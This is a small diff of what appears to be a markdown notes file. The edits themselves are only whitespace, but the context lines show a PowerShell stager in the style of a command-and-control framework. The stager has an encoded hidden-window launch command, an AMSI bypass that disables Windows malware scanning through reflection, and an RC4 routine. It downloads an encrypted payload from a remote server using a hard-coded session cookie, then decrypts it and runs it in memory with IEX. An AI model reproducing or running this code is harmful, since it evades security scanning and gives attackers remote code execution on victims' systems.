@@ -21,7 +21,6 @@ powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA
 ```
 
 ```powershell
-
 If($PSVersionTable.PSVersion.Major -ge 3){
     $Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
     $Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);
@@ -42,4 +41,4 @@ If($PSVersionTable.PSVersion.Major -ge 3){
     $S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];
     $_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","bbbbbbbasdlOfroelqxzwweerrykx=a/i72W41wKzEFZfOyPFM3BFJN+s=");$data=$wc.DownloadData($ser+$t);
     $iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
-	```
+```
